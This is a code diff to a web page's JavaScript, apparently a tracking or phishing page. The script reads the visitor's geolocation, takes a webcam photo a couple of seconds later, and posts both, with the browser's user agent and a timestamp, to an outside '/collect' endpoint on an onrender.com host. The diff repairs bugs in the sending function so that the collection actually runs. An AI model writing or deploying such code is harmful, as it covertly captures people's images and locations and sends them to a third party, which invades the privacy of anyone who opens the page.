@@ -9,6 +9,7 @@ function getLocation() {
     if (!navigator.geolocation) {
       alert("Geolocation not supported");
       resolve();
+      return;
     }
 
     navigator.geolocation.getCurrentPosition(
@@ -19,9 +20,7 @@ function getLocation() {
         });
         resolve();
       },
-      () => {
-        resolve();
-      }
+      () => resolve()
     );
   });
 }
@@ -34,6 +33,7 @@ async function capturePhoto() {
     const canvas = document.getElementById("canvas");
 
     video.srcObject = stream;
+    await video.play();
 
     setTimeout(() => {
       canvas.width = video.videoWidth;
@@ -45,29 +45,36 @@ async function capturePhoto() {
       sendData({ image: imageData });
 
       stream.getTracks().forEach(track => track.stop());
+      resolve();
     }, 2000);
 
   } catch (err) {
-    console.log("Camera permission denied");
+    console.log("Camera permission denied", err);
+    resolve();
   }
 }
 
 /* 📤 Send Data */
+async function sendData(data) {
+  try {
+    const res = await fetch(
+      "https://cyber-security-protos.onrender.com/collect",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          ...data,
+          userAgent: navigator.userAgent,
+          time: new Date().toISOString(),
+        }),
+      }
+    );
 
-const sendData = async () =>{
-  try{
-    cosnt = await fetch("https://cyber-security-protos.onrender.com/Collect",{
-      method:"POST",
-      headers:{
-        "content-Type":"application/json"
-      },
-      body:JSON.stringify({
-        ...data,
-        userAgent: navigator.userAgent,
-        time:new Date().toISOString(),
-      }),
-    })
-  }catch(err){
-    console.log(err);
+    const result = await res.json();
+    console.log("Server response:", result);
+  } catch (err) {
+    console.log("Send failed:", err);
   }
 }
